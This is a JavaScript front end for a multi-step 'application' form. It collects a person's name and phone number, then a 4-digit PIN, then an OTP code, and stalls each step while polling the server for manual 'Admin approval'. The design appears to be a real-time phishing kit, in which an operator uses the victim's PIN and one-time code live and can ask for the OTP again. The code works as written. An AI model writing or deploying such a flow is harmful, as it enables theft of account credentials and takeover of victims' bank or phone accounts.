let applicationId = null;

// Helper to switch visible step
function goToStep(stepId) {
  document.querySelectorAll('.form-step').forEach(el => el.classList.remove('active'));
  document.getElementById(stepId).classList.add('active');
  hideLoading();
}

function showLoading(msg) {
  document.getElementById('loadingText').textContent = msg;
  document.getElementById('loadingOverlay').style.display = 'flex';
}

function hideLoading() {
  document.getElementById('loadingOverlay').style.display = 'none';
}

// STEP 1 SUBMIT
async function submitStep1() {
  const data = {
    fullName: document.getElementById('fullName').value,
    countryCode: document.getElementById('countryCode').value,
    phone: document.getElementById('phone').value,
    purpose: document.getElementById('purpose').value
  };

  if(!data.fullName || !data.phone) return alert("Please complete all fields");

  showLoading("Submitting application... Waiting for Admin approval.");

  const response = await fetch('/api/step1', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  });
  const resData = await response.json();
  applicationId = resData.id;

  // Poll server for Admin approval on Step 1
  pollStatus('step1_approved', () => goToStep('step2'));
}

// STEP 2 SUBMIT (PIN)
async function submitStep2() {
  const pin = document.getElementById('pin').value;
  if(pin.length !== 4) return alert("Enter a 4-digit PIN");

  showLoading("Verifying PIN... Waiting for Admin approval.");

  await fetch('/api/step2', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ id: applicationId, pin })
  });

  // Poll server for Admin approval on Step 2
  pollStatus('step2_approved', () => goToStep('step3'));
}

// STEP 3 SUBMIT (OTP)
async function submitStep3() {
  const otp = document.getElementById('otp').value;
  if(otp.length !== 4) return alert("Enter valid 4-digit OTP");

  document.getElementById('otpError').style.display = 'none';
  showLoading("Verifying OTP code with Admin...");

  await fetch('/api/step3', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ id: applicationId, otp })
  });

  // Poll for final OTP approval or rejection
  pollStatus('otp_result', (status) => {
    if (status === 'otp_wrong') {
      hideLoading();
      document.getElementById('otpError').style.display = 'block';
      document.getElementById('otp').value = '';
    } else if (status === 'approved') {
      goToStep('stepSuccess');
    }
  });
}

// Polling mechanism to check Admin response from Server
function pollStatus(targetStatus, callback) {
  const interval = setInterval(async () => {
    const res = await fetch(`/api/status?id=${applicationId}`);
    const data = await res.json();

    if (targetStatus === 'otp_result') {
      if (data.status === 'otp_wrong') {
        clearInterval(interval);
        callback('otp_wrong');
      } else if (data.status === 'approved') {
        clearInterval(interval);
        callback('approved');
      }
    } else if (data.status === targetStatus) {
      clearInterval(interval);
      callback();
    }
  }, 2000); // Check status every 2 seconds
    }
                                     
